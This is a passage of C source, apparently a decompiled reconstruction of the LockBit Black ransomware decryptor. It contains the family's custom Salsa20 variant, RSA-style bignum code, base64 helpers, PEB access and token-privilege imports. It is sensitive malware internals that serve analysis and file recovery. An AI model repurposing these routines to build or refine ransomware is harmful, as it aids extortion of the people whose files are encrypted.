/*
From This Project we can see that LockBit used
RSA-1024 and (Custom) Salsa20 For Files/Keys

Very Interesting and maybe helpful!
*/

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <ntsecapi.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <sddl.h>
#include <winnetwk.h>
#include <emmintrin.h>
#include <smmintrin.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <winternl.h>

#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "ntdll.lib")
#endif

/*-------------------------------------------------------------------------
 * Minimal NT / PEB definitions for standalone x86 MinGW compilation
 *-----------------------------------------------------------------------*/
// typedef LONG NTSTATUS;
/*
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;
*/
#ifndef WM_COPYGLOBALDATA
#define WM_COPYGLOBALDATA 0x0049
#endif

/*
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemProcessInformation = 5
} SYSTEM_INFORMATION_CLASS;
*/

/*
typedef enum _PROCESSINFOCLASS {
    ProcessPriorityClass = 18,
    ProcessDefaultHardErrorMode = 21,
    ProcessIoPriority = 33
} PROCESSINFOCLASS;
*/

/*
typedef enum _THREADINFOCLASS {
    ThreadImpersonationToken = 5
} THREADINFOCLASS;
*/
typedef struct _X86_RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} X86_RTL_USER_PROCESS_PARAMETERS, *PX86_RTL_USER_PROCESS_PARAMETERS;

typedef struct _X86_PEB {
    BYTE                              InheritedAddressSpace;
    BYTE                              ReadImageFileExecOptions;
    BYTE                              BeingDebugged;
    BYTE                              SpareBool;
    HANDLE                            Mutant;
    PVOID                             ImageBaseAddress;
    PVOID                             Ldr;
    PX86_RTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                             SubSystemData;
    HANDLE                            ProcessHeap;
    PVOID                             FastPebLock;
    PVOID                             AtlThunkSListPtr;
    PVOID                             IFEOKey;
    ULONG                             CrossProcessFlags;
    PVOID                             UserSharedInfoPtr;
    DWORD                             SystemReserved;
    DWORD                             AtlThunkSListPtr32;
    PVOID                             ApiSetMap;
    ULONG                             TlsExpansionCounter;
    PVOID                             TlsBitmap;
    DWORD                             TlsBitmapBits[2];
    PVOID                             ReadOnlySharedMemoryBase;
    PVOID                             HotpatchInformation;
    PVOID*                            ReadOnlyStaticServerData;
    PVOID                             AnsiCodePageData;
    PVOID                             OemCodePageData;
    PVOID                             UnicodeCaseTableData;
    ULONG                             NumberOfProcessors;
    DWORD                             NtGlobalFlag;
    LARGE_INTEGER                     CriticalSectionTimeout;
    ULONG                             HeapSegmentReserve;
    ULONG                             HeapSegmentCommit;
    ULONG                             HeapDeCommitTotalFreeThreshold;
    ULONG                             HeapDeCommitFreeBlockThreshold;
    ULONG                             NumberOfHeaps;
    ULONG                             MaximumNumberOfHeaps;
    PVOID*                            ProcessHeaps;
    PVOID                             GdiSharedHandleTable;
    PVOID                             ProcessStarterHelper;
    DWORD                             GdiDCAttributeList;
    PVOID                             LoaderLock;
    ULONG                             OSMajorVersion;
    ULONG                             OSMinorVersion;
    USHORT                            OSBuildNumber;
    USHORT                            OSCSDVersion;
    ULONG                             OSPlatformId;
    ULONG                             ImageSubsystem;
    ULONG                             ImageSubsystemMajorVersion;
    ULONG                             ImageSubsystemMinorVersion;
    ULONG                             ImageProcessAffinityMask;
    ULONG                             GdiHandleBuffer[34];
    PVOID                             PostProcessInitRoutine;
    PVOID                             TlsExpansionBitmap;
    DWORD                             TlsExpansionBitmapBits[32];
    ULONG                             SessionId;
} X86_PEB, *PX86_PEB;

/* NT / RTL imports */
NTSYSAPI NTSTATUS NTAPI NtTerminateThread(HANDLE ThreadHandle, NTSTATUS ExitStatus);
NTSYSAPI NTSTATUS NTAPI NtClose(HANDLE Handle);
NTSYSAPI NTSTATUS NTAPI NtDuplicateToken(
    HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly,
    TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
NTSYSAPI NTSTATUS NTAPI NtOpenProcess(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
NTSYSAPI NTSTATUS NTAPI NtOpenProcessToken(
    HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
NTSYSAPI NTSTATUS NTAPI NtQueryInformationToken(
    HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
    PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
NTSYSAPI NTSTATUS NTAPI NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength);
NTSYSAPI NTSTATUS NTAPI NtSetInformationProcess(
    HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength);
NTSYSAPI NTSTATUS NTAPI NtSetInformationThread(
    HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass,
    PVOID ThreadInformation, ULONG ThreadInformationLength);
NTSYSAPI NTSTATUS NTAPI RtlAdjustPrivilege(
    ULONG Privilege, BOOLEAN NewValue, BOOLEAN ForThread, PBOOLEAN OldValue);
NTSYSAPI PVOID NTAPI RtlAllocateHeap(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
/*NTSYSAPI PVOID NTAPI RtlCreateHeap(
    ULONG Flags, PVOID BaseAddress, SIZE_T SizeToReserve,
    SIZE_T SizeToCommit, PVOID Lock, PVOID Parameters);
*/
NTSYSAPI NTSTATUS NTAPI RtlDeleteCriticalSection(PRTL_CRITICAL_SECTION CriticalSection);
NTSYSAPI HANDLE NTAPI RtlDestroyHeap(HANDLE Heap);
NTSYSAPI NTSTATUS NTAPI RtlEnterCriticalSection(PRTL_CRITICAL_SECTION CriticalSection);
NTSYSAPI BOOLEAN NTAPI RtlFreeHeap(HANDLE HeapHandle, ULONG Flags, PVOID P);
NTSYSAPI NTSTATUS NTAPI RtlInitializeCriticalSection(PRTL_CRITICAL_SECTION CriticalSection);
NTSYSAPI NTSTATUS NTAPI RtlLeaveCriticalSection(PRTL_CRITICAL_SECTION CriticalSection);
NTSYSAPI PVOID NTAPI RtlReAllocateHeap(HANDLE Heap, ULONG Flags, PVOID Ptr, SIZE_T Size);

/* MD5 imports present in IAT */
int __stdcall MD5Init(void* ctx);
int __stdcall MD5Update(void* ctx, const void* data, unsigned int len);
int __stdcall MD5Final(void* ctx);

/*-------------------------------------------------------------------------
 * x86 Helper Intrinsics (GCC/Clang AT&T syntax & portable C)
 *-----------------------------------------------------------------------*/
static __inline uint32_t rol32(uint32_t val, int shift) {
    shift &= 31;
    return (val << shift) | (val >> ((32 - shift) & 31));
}

static __inline uint32_t ror32(uint32_t val, int shift) {
    shift &= 31;
    return (val >> shift) | (val << ((32 - shift) & 31));
}

static __inline bool cf_add32(uint32_t a, uint32_t b) {
    return (uint32_t)(a + b) < a;
}

static __inline DWORD read_teb_last_error(void) {
    DWORD err;
    __asm__ volatile ("movl %%fs:0x34, %0" : "=r"(err));
    return err;
}

static __inline PX86_PEB get_peb_x86(void) {
    PX86_PEB peb;
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(peb));
    return peb;
}

/*-------------------------------------------------------------------------
 * Global Data Declarations
 *-----------------------------------------------------------------------*/
WCHAR pszMore[] = L"NTUSER.DAT";
wchar_t aTrueSS[12] = L"true|%s|%s\n";
wchar_t aFileEmpty[11] = L"file empty";
wchar_t aFileNotFound[15] = L"file not found";
wchar_t aFileNotEncrypt[30] = L"file not encrypted or damaged";
wchar_t aFileRsaKeyNotV[23] = L"file rsa key not valid";
wchar_t aFalseSS[13] = L"false|%s|%s\n";
ULONG g_PrivilegeList[] = { 0 };
wchar_t a08x04x04x02x02[51] = L"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}";
wchar_t aSReadmeTxt[14] = L"%s.README.txt";
WCHAR ModuleName[] = L"advapi32.dll";
CHAR ProcName[] = "RegDeleteKeyExW";
WCHAR ValueName[] = L"WallPaper";
WCHAR ConsoleTitle[] = L"LockBit Black Decryptor";
wchar_t aFindingFilesIn[] = L"Finding Files In Progress...\r\n";
wchar_t aWait[] = L"Wait...\r\n";
wchar_t aFoundUFileS[18] = L"Found %u File(s)\r";
wchar_t aFoundUFileS_0[18] = L"Found %u File(s)\r";
wchar_t aDecryptingFile[] = L"\r\n\nDecrypting Files In Progress...\r\n";
wchar_t aWait_0[] = L"Wait...\r\n";
wchar_t aDecryptedUFile[22] = L"Decrypted %u File(s)\r";
wchar_t aDecryptedUFile_0[22] = L"Decrypted %u File(s)\r";
wchar_t aDecryptingFini[] = L"\r\n\nDecrypting Finished";
wchar_t aPressAnyKeyToE[] = L"\r\n\nPress Any Key To Exit...";
WCHAR String[] = L"LockBit Black Decryptor";
WCHAR aDecryptAllEncr[] = L"Decrypt All Encrypted Files";
WCHAR aUser32[] = L"user32";
CHAR aChangewindowme[] = "ChangeWindowMessageFilter";
WCHAR Text[] = L"Network Connection Unavailable";
WCHAR Caption[] = L"[ERROR]";
WCHAR aFindingFilesIn_0[] = L"Finding Files In Progress...";
WCHAR aDecryptingFile_0[] = L"Decrypting File In Progress...";
WCHAR aDecryptingFile_1[] = L"Decrypting Files In Progress...";
WCHAR aDecryptAllEncr_0[] = L"Decrypt All Encrypted Files";
WCHAR aDecryptAllEncr_1[] = L"Decrypt All Encrypted Files";
WCHAR aFindingFilesIn_1[] = L"Finding Files In Progress...";
WCHAR aNtdllDll_0[] = L"ntdll.dll";
CHAR aNtsetthreadexe[] = "NtSetThreadExecutionState";

int dword_407700 = 0;
void* dword_407704 = NULL;
int dword_407708 = 0;
HANDLE hFile = NULL;
wchar_t Buffer[1024] = { 0 };

typedef LSTATUS (__stdcall *PFN_RegDeleteKeyExW)(HKEY, LPCWSTR, REGSAM, DWORD);
PFN_RegDeleteKeyExW pfnRegDeleteKeyExW = NULL;

HANDLE CompletionPort = NULL;
volatile LONG dword_407F18 = 0;
volatile LONG Addend = 0;
RTL_CRITICAL_SECTION CriticalSection;
BOOL (__stdcall *pfnChangeWindowMessageFilter)(UINT message, DWORD dwFlag) = NULL;
HANDLE hHandle = NULL;
LPWSTR P = NULL;
LPCWSTR pszPath = NULL;
PVOID dword_407F48 = NULL;
int dword_407F4C = 0;
int dword_407F50 = 0;
int dword_407F54 = 0;
SIZE_T Size = 0;
volatile LONG uValue = 0;
volatile LONG dword_407F60 = 0;
NETRESOURCEW NetResource;
HANDLE ExistingTokenHandle = NULL;

uint64_t qword_409000 = 1342682571728816990ULL;
DWORD dword_40900C[2045] = {
    179224035, -1489911826, 854177037, 1298477776, 1043468748, 824526692, 1946074556, 170468124,
    2124054746, 1160388226, 6187212, -1938250728, 1684384370, 277221901, -1599273303, -107750116,
    -1565304859, 166370975, 586031672, -1812438337, -824519309, 1493511807, -1152305786, -1795909458,
    87323752, 1961505232, -9922381, 804873483, -837241432, 2042422424, -1896996317, -1278465676,
    1155187439, -2039468841, 556748042, -497197931, -335398617, 1832131753, -532922784, -354546895,
    -58201899, 632235044, 2079529139, -32276690, -162112012, -707996493, -98282508, -1591036387,
    -2119197912, -65025902, -18848340, -1230374058, -2024011302, 764499781, 243766652, -421952443,
    855559001, -1960937474, -539488059, -1326908607, 1547933256, -309439773, -995203875, 752257501,
    -807722310, 725921067, -2103350408, -423026237, -1826650868, -808823694, -1654959923, -393137840,
    -797278406, 1043086252, 1481520667, 254214817, 398605832, 189644464, -1311888345, -185072375,
    -345375230, 778543585, -1274443578, -801398946, 1282536799, -970231802, -454831873, 829336210,
    -1537724499, -2088909566, -385876629, 1388181346, 106, 0
}; /* idk what these are */

/*-------------------------------------------------------------------------
 * Forward Declarations
 *-----------------------------------------------------------------------*/
uint64_t __stdcall sub_401004(uint64_t a1, uint64_t a2);
int __stdcall sub_40103C(const uint16_t* a1, int a2);
int __stdcall sub_401084(const int16_t* a1, uint8_t* a2);
int __stdcall sub_4010AC(char* a1, uint8_t* a2);
char* __stdcall sub_4011CC(int a1, const uint8_t* a2, int a3, int* a4);
int sub_4012D0(void);
int __stdcall sub_401324(const uint8_t* a1, uint32_t a2, uint32_t a3);
DWORD __stdcall sub_401398(wchar_t* String, int wAttributes);
int sub_4013EC(void);
ULONG sub_401418(void);
uint32_t __stdcall sub_40142C(const char* a1);
int sub_401478(void);
PWSTR sub_401554(void);
void __stdcall sub_401564(wchar_t* a1);
void __stdcall sub_401594(wchar_t* a1);
char __stdcall sub_4015C4(uint32_t* a1, const uint8_t* a2, uint32_t* a3);
int __stdcall sub_4016F4(__m128i* a1, uint32_t* a2, uint32_t* a3);
void sub_4017DE(uint32_t* state);
int sub_40183E(uint8_t cf_in, uint32_t* a2, const uint32_t* a3);
int sub_4018FD(bool cf_in, uint32_t* a2, const uint32_t* a3);
void __cdecl sub_4019BC(uint32_t a1, __m128i* a2, uint32_t a3);
uint64_t __stdcall sub_401DF0(uint8_t* a1, int a2);
uint64_t __stdcall sub_401E7C(uint64_t* a1, uint64_t* a2);
uint64_t __stdcall sub_401EC0(const uint32_t* a1, uint8_t* a2);
PVOID __stdcall sub_401FA8(SIZE_T Size);
PVOID __stdcall sub_401FC4(PVOID Ptr, SIZE_T Size);
BOOLEAN __stdcall sub_401FE4(PVOID P);
PVOID __stdcall sub_402000(PVOID HeapHandle, SIZE_T Size);
uint32_t* __stdcall sub_402014(int a1);
BOOLEAN __stdcall sub_402050(void* a1);
wchar_t* __stdcall sub_40206C(const wchar_t* String, int a2);
uint32_t* __stdcall sub_4020C4(const wchar_t* String);
uint32_t* __stdcall sub_402124(const wchar_t* String);
BOOL __stdcall sub_402230(HANDLE hFileArg, int a3, const wchar_t* Format, const wchar_t* a5);
BOOL sub_4022E0(void);
void* sub_40233C(void);
DWORD sub_402450(void);
ULONG sub_4024FC(void);
uint8_t* __stdcall sub_402528(const uint32_t* a1);
int __stdcall sub_4025F0(wchar_t* outBuf);
void* sub_402678(void);
int sub_40271C(void);
char sub_402770(void);
BOOL __stdcall sub_402800(LPCWSTR pszPath, DWORD lowSize, DWORD highSize);
int __stdcall sub_402848(HANDLE a1, wchar_t* Destination);
void sub_4028F0(void);
char sub_402B3C(void);
BOOL __stdcall sub_402B8C(HANDLE ExistingTokenHandle, HANDLE ThreadHandle);
ULONG __stdcall StartAddress(PVOID Parameter);
DWORD __stdcall sub_402C28(HANDLE ExistingTokenHandle, LPCWSTR a2, DWORD a3, LPVOID a4, LPDWORD a5);
ULONG __stdcall sub_402CD4(PVOID Parameter);
DWORD __stdcall sub_402CE8(HANDLE ExistingTokenHandle, DWORD a2, LPWSTR a3);
ULONG __stdcall sub_402D98(const WCHAR* Parameter);
DWORD __stdcall sub_402DA8(HANDLE ExistingTokenHandle, LPVOID lpParameter);
BOOL __stdcall sub_402E48(LPCWSTR lpFileName, PLARGE_INTEGER lpFileSize);
char sub_402E94(void);
DWORD __stdcall sub_4030DC(LPVOID lpParam);
int sub_4033B0(void);
NTSTATUS __stdcall sub_403430(int a1);
uint32_t* __stdcall sub_403474(const uint8_t* a1, uint32_t a2);
int __stdcall sub_4034CC(LPCWSTR lpFileName);
DWORD __stdcall sub_403584(LPCWSTR lpFileName, void** a3);
LPCWSTR __stdcall sub_40369C(wchar_t* P);
wchar_t* __stdcall sub_40378C(const wchar_t* a1, uint16_t* a2);
char* __stdcall sub_403890(int a1, const uint8_t* a2, uint64_t a3);
int __stdcall sub_403960(WCHAR* lpExistingFileName, uint64_t a3, PVOID* a4);
wchar_t* __stdcall sub_403BD4(const wchar_t* String);
wchar_t* __stdcall sub_403C3C(const wchar_t* String, const wchar_t* Source);
int __stdcall sub_403C90(const uint16_t* a1);
DWORD __stdcall sub_403CEC(LPVOID lpParameter);
DWORD __stdcall sub_403F98(LPVOID lpParam);
int sub_403FD0(void);
DWORD __stdcall sub_40421C(LPVOID lpParameter);
char __stdcall sub_4042C0(const wchar_t* String, const wchar_t* lpFileName);
INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM wParam, LPARAM lParam);
INT_PTR sub_404C0C(void);
unsigned int sub_404C30(void);
void sub_404EBC(const uint8_t* a2, uint8_t* a3);

/*-------------------------------------------------------------------------
 * Reconstructed Functions
 *-----------------------------------------------------------------------*/
uint64_t __stdcall sub_401004(uint64_t a1, uint64_t a2) {
    uint32_t hi1 = (uint32_t)(a1 >> 32);
    uint32_t hi2 = (uint32_t)(a2 >> 32);
    if ((hi1 | hi2) != 0)
        return a1 * a2;
    else
        return (uint64_t)(uint32_t)a2 * (uint64_t)(uint32_t)a1;
}

int __stdcall sub_40103C(const uint16_t* a1, int a2) {
    uint32_t hash = (uint32_t)a2;
    for (;;) {
        uint32_t ch = *a1++;
        if (ch >= 0x41u && ch <= 0x5Au)
            ch |= 0x20u;
        hash = ch + ror32(hash, 13);
        if (ch == 0)
            break;
    }
    return (int)hash;
}

int __stdcall sub_401084(const int16_t* a1, uint8_t* a2) {
    int i = 0;
    for (;;) {
        int16_t ch = *a1++;
        if (ch == 0)
            break;
        *a2++ = (uint8_t)ch;
        ++i;
    }
    *a2 = 0;
    return i;
}

int __stdcall sub_4010AC(char* a1, uint8_t* a2) {
    uint8_t table[256];
    uint8_t* p = table;
    uint8_t val = 52;

    table[0] = 0;
    memset(&table[1], 0xFF, 0x2A);
    table[43] = 62;
    memset(&table[44], 0xFF, 3);
    table[47] = 63;

    p = &table[48];
    for (int i = 10; i != 0; --i) {
        *p++ = val++;
    }
    memset(p, 0xFF, 3);
    p += 3;
    *p++ = 0;
    memset(p, 0xFF, 3);
    p += 3;

    val = 0;
    for (int i = 26; i != 0; --i) {
        *p++ = val++;
    }
    memset(p, 0xFF, 6);
    p += 6;
    for (int i = 26; i != 0; --i) {
        *p++ = val++;
    }
    memset(p, 0xFF, 0x85);

    char* scan = a1;
    char* src = a1;
    char ch;
    do {
        ch = *scan;
        scan += 4;
    } while (ch != 0);

    size_t len = (size_t)((scan - 4) - a1);
    if (len == 0)
        return 61;

    int pad = 0;
    if (*(scan - 5) == '=') {
        *(scan - 5) = 0;
        pad += 1;
    }
    if (*(scan - 6) == '=') {
        *(scan - 6) = 0;
        pad += 1;
    }

    unsigned int blocks = (unsigned int)(len >> 2);
    int out_len = (int)(3 * blocks) - pad;

    for (unsigned int b = blocks; b != 0; --b) {
        uint32_t q = *(const uint32_t*)src;
        src += 4;
        uint8_t c0 = table[(uint8_t)(q & 0xFF)];
        uint8_t c1 = table[(uint8_t)((q >> 8) & 0xFF)];
        uint8_t c2 = table[(uint8_t)((q >> 16) & 0xFF)];
        uint8_t c3 = table[(uint8_t)((q >> 24) & 0xFF)];

        uint16_t hi = (uint16_t)((uint16_t)c2 << 6);
        a2[0] = (uint8_t)((c1 >> 4) | (4 * c0));
        a2[2] = (uint8_t)(hi | c3);
        a2[1] = (uint8_t)((hi >> 8) | (16 * c1));
        a2 += 3;
    }
    return out_len;
}

char* __stdcall sub_4011CC(int a1, const uint8_t* a2, int a3, int* a4) { /* BASIC BASE64 */
    static const char b64[65] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    uint8_t* dst = (uint8_t*)a4;
    int rem = a3;

    (void)a1;
    while (rem > 0) {
        uint8_t s0 = b64[(a2[0] >> 2) & 0x3F];
        uint8_t s1 = b64[((a2[1] >> 4) | (16 * (a2[0] & 3))) & 0x3F];
        uint8_t s2 = b64[((4 * (a2[1] & 0xF)) | (a2[2] >> 6)) & 0x3F];
        uint8_t s3 = b64[a2[2] & 0x3F];

        uint32_t word = (uint32_t)s0 | ((uint32_t)s1 << 8) |
                        ((uint32_t)s2 << 16) | ((uint32_t)s3 << 24);
        *(uint32_t*)dst = word;
        dst += 4;
        a2 += 3;
        rem -= 3;
    }

    if (rem != 0) {
        dst += rem;
        do {
            *dst++ = '=';
            ++rem;
        } while (rem != 0);
    }

    *(uint16_t*)dst = 0;
    return (char*)(dst - (uint8_t*)a4);
}

int sub_4012D0(void) {
    WCHAR path[MAX_PATH];
    SHGetSpecialFolderPathW(NULL, path, CSIDL_PROFILE, FALSE);
    PathAppendW(path, pszMore);
    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES)
        return 1;
    return 0;
}

int __stdcall sub_401324(const uint8_t* a1, uint32_t a2, uint32_t a3) {
    uint32_t rem = a2;
    uint32_t s1 = a3 & 0xFFFFu;
    uint32_t s2 = (a3 >> 16) & 0xFFFFu;

    while (rem != 0) {
        uint32_t n = 4001u;
        if (rem < 0xFA1u)
            n = rem;
        rem -= n;
        do {
            s1 += *a1++;
            s2 += s1;
            --n;
        } while (n != 0);
        s2 %= 0x1000Fu;
        s1 %= 0x1000Fu;
    }
    return (int)(((const uint32_t*)dword_407704)[32] ^ ((s2 << 16) + s1));
}

DWORD __stdcall sub_401398(wchar_t* String, int wAttributes) {
    DWORD written = 0;
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (wAttributes != 0)
        SetConsoleTextAttribute(hOut, (WORD)wAttributes);
    DWORD len = (DWORD)wcslen(String);
    WriteConsoleW(hOut, String, len, &written, NULL);
    return written;
}

int sub_4013EC(void) {
    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    FlushConsoleInputBuffer(hIn);
    do {
        Sleep(1);
    } while (_kbhit() == 0);
    return _getch();
}

ULONG sub_401418(void) {
    ULONG n = get_peb_x86()->NumberOfProcessors;
    if (n >= 4)
        n >>= 1;
    return n;
}

uint32_t __stdcall sub_40142C(const char* a1) {
    int pad = 0;
    int i = 0;
    while (a1[i] != 0)
        ++i;
    if (i != 0) {
        if (a1[i - 1] == '=' && a1[i - 2] == '=')
            pad = 2;
        else if (a1[i - 1] == '=')
            pad = 1;
    }
    return (((uint32_t)(3 * i)) >> 2) - (uint32_t)pad;
}

int sub_401478(void) {
    PX86_PEB peb = get_peb_x86();
    ULONG major = peb->OSMajorVersion;
    ULONG minor = peb->OSMinorVersion;

    if ((major == 5 && minor == 0) || major < 5)
        return 0;
    if (major == 5 && minor == 1)
        return 51;
    if (major == 5 && minor == 2)
        return 52;
    if (major == 6 && minor == 0)
        return 60;
    if (major == 6 && minor == 1)
        return 61;
    if (major == 6 && minor == 2)
        return 62;
    if (major == 6 && minor == 3)
        return 63;
    if (major == 10 && minor == 0)
        return 100;
    if ((major == 10 && minor != 0) || major > 0xAu)
        return 0x7FFFFFFF;
    return -1;
}

PWSTR sub_401554(void) {
    return get_peb_x86()->ProcessParameters->ImagePathName.Buffer;
}

void __stdcall sub_401564(wchar_t* a1) {
    if (a1 != NULL) {
        int i = 0;
        while (a1[i] != 0)
            ++i;
        if (i == 0 || a1[i - 1] != L'\\')
            *(uint32_t*)&a1[i] = L'\\';
    }
}

void __stdcall sub_401594(wchar_t* a1) {
    if (a1 != NULL) {
        int i = 0;
        while (a1[i] != 0)
            ++i;
        if (i > 0 && a1[i - 1] == L'\\')
            *(uint32_t*)&a1[i - 1] = 0;
    }
}

char __stdcall sub_4015C4(uint32_t* a1, const uint8_t* a2, uint32_t* a3) {
    __m128i acc[9];
    uint32_t tmp[36];

    for (int k = 0; k < 8; ++k)
        acc[k] = _mm_setzero_si128();
    acc[0] = _mm_set_epi8(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1);

    const uint8_t* p = a2 + 128;
    int idx = 129;
    uint8_t b;
    do {
        --p;
        --idx;
        b = *p;
    } while (b == 0);

    int outer = idx;
    char result = 0;
    do {
        int bit = 8;
        do {
            for (int k = 0; k < 8; ++k)
                ((__m128i*)tmp)[k] = acc[k];
            sub_4016F4(acc, tmp, a3);
            --bit;
            result = (char)(*p & (1 << bit));
            if (result != 0)
                result = (char)sub_4016F4(acc, a1, a3);
        } while (bit != 0);
        --p;
        --outer;
    } while (outer != 0);

    __m128i* out = (__m128i*)a1;
    for (int k = 0; k < 8; ++k)
        out[k] = acc[k];
    return result;
}

int __stdcall sub_4016F4(__m128i* a1, uint32_t* a2, uint32_t* a3) {
    uint32_t state[35];
    uint32_t* dst = state;
    for (int k = 0; k < 8; ++k) {
        *(__m128i*)dst = _mm_setzero_si128();
        dst += 4;
    }

    int result = 0;
    uint8_t cf = 0;
    for (int i = 1024; i != 0; --i) {
        sub_4017DE(state);
        cf = (uint8_t)sub_4018FD(false, state, a3);
        if (cf)
            sub_40183E(0, state, a3);
        sub_4017DE(state);
        if (cf)
            sub_40183E(0, state, a2);
        result = sub_4018FD(false, state, a3);
        if (result)
            result = sub_40183E(0, state, a3);
    }

    const __m128i* src = (const __m128i*)state;
    for (int k = 0; k < 8; ++k)
        *a1++ = _mm_load_si128(src++);
    return result;
}

void sub_4017DE(uint32_t* state) {
    uint32_t carry = 0;
    for (int i = 0; i < 32; ++i) {
        uint32_t w = state[i];
        uint32_t next_carry = (w >> 31) & 1u;
        state[i] = (w << 1) | carry;
        carry = next_carry;
    }
}

int sub_40183E(uint8_t cf_in, uint32_t* a2, const uint32_t* a3) {
    uint8_t c = cf_in ? 1u : 0u;
    int last = 0;
    for (int i = 0; i < 32; ++i) {
        uint32_t s = a3[i];
        uint32_t d = a2[i];
        uint32_t t = d + s;
        bool c1 = cf_add32(d, s);
        uint32_t r = t + c;
        bool c2 = cf_add32(t, c);
        a2[i] = r;
        c = (uint8_t)(c1 || c2);
        last = (int)s;
    }
    return last;
}

int sub_4018FD(bool cf_in, uint32_t* a2, const uint32_t* a3) {
    uint32_t b = cf_in ? 1u : 0u;
    int last = 0;
    for (int i = 0; i < 32; ++i) {
        uint32_t s = a3[i];
        uint32_t sub = s + b;
        bool borrow = (a2[i] < sub) || (b && sub < s);
        a2[i] -= sub;
        b = borrow ? 1u : 0u;
        last = (int)s;
    }
    return last;
}

void __cdecl sub_4019BC(uint32_t a1, __m128i* a2, uint32_t a3) { /* SALSA20 */
    if (a1 == 0)
        return;

    uint32_t* ctx = (uint32_t*)a3;
    uint32_t rem = a1;
    uint8_t* out = (uint8_t*)a2;

    while (rem != 0) {
        uint32_t x[16];
        for (int i = 0; i < 16; ++i)
            x[i] = ctx[i];

        for (int round = 0; round < 10; ++round) {
            x[4]  ^= rol32(x[0]  + x[12], 7);
            x[8]  ^= rol32(x[4]  + x[0],  9);
            x[12] ^= rol32(x[8]  + x[4],  13);
            x[0]  ^= ror32(x[12] + x[8],  14);

            x[9]  ^= rol32(x[5]  + x[1],  7);
            x[13] ^= rol32(x[9]  + x[5],  9);
            x[1]  ^= rol32(x[13] + x[9],  13);
            x[5]  ^= ror32(x[1]  + x[13], 14);

            x[14] ^= rol32(x[10] + x[6],  7);
            x[2]  ^= rol32(x[14] + x[10], 9);
            x[6]  ^= rol32(x[2]  + x[14], 13);
            x[10] ^= ror32(x[6]  + x[2],  14);

            x[3]  ^= rol32(x[15] + x[11], 7);
            x[7]  ^= rol32(x[3]  + x[15], 9);
            x[11] ^= rol32(x[7]  + x[3],  13);
            x[15] ^= ror32(x[11] + x[7],  14);

            x[1]  ^= rol32(x[0]  + x[3],  7);
            x[2]  ^= rol32(x[1]  + x[0],  9);
            x[3]  ^= rol32(x[2]  + x[1],  13);
            x[0]  ^= ror32(x[3]  + x[2],  14);

            x[6]  ^= rol32(x[5]  + x[4],  7);
            x[7]  ^= rol32(x[6]  + x[5],  9);
            x[4]  ^= rol32(x[7]  + x[6],  13);
            x[5]  ^= ror32(x[4]  + x[7],  14);

            x[11] ^= rol32(x[10] + x[9],  7);
            x[8]  ^= rol32(x[11] + x[10], 9);
            x[9]  ^= rol32(x[8]  + x[11], 13);
            x[10] ^= ror32(x[9]  + x[8],  14);

            x[12] ^= rol32(x[15] + x[14], 7);
            x[13] ^= rol32(x[12] + x[15], 9);
            x[14] ^= rol32(x[13] + x[12], 13);
            x[15] ^= ror32(x[14] + x[13], 14);
        }

        for (int i = 0; i < 16; ++i)
            x[i] += ctx[i];

        bool carry = cf_add32(ctx[8], 1u);
        ctx[8] += 1u;
        ctx[9] += carry ? 1u : 0u;

        uint32_t blk = (rem > 64u) ? 64u : rem;
        const uint8_t* ks = (const uint8_t*)x;
        for (uint32_t i = 0; i < blk; ++i)
            out[i] ^= ks[i];

        out += blk;
        rem -= blk;
    }
}

uint64_t __stdcall sub_401DF0(uint8_t* a1, int a2) {
    uint64_t state = qword_409000;
    uint64_t result = 0;
    int pos = 0;

    while (pos < a2) {
        result = sub_401E7C(&qword_409000, &state);
        for (int pass = 0; pass < 2 && pos < a2; ++pass) {
            uint8_t bytes[4] = {
                (uint8_t)(result & 0xFF),
                (uint8_t)((result >> 8) & 0xFF),
                (uint8_t)((result >> 32) & 0xFF),
                (uint8_t)((result >> 40) & 0xFF)
            };
            for (int b = 0; b < 4 && pos < a2; ++b, ++pos) {
                *a1++ ^= bytes[b];
            }
            uint32_t lo = (uint32_t)(result >> 16);
            uint32_t hi = (uint32_t)((result >> 32) >> 16);
            result = ((uint64_t)hi << 32) | lo;
        }
    }
